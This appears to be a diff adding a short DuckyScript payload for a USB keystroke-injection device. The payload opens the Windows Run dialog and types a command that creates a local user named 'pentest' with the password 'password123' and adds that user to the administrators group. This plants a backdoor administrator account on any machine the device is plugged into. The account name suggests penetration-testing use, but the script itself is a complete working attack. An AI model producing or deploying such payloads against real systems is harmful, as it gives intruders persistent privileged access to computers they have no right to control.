@@ -1,0 +1,6 @@
+REM Add Admin User
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /k "net user pentest password123 /add & net localgroup administrators pentest /add"
+ENTER
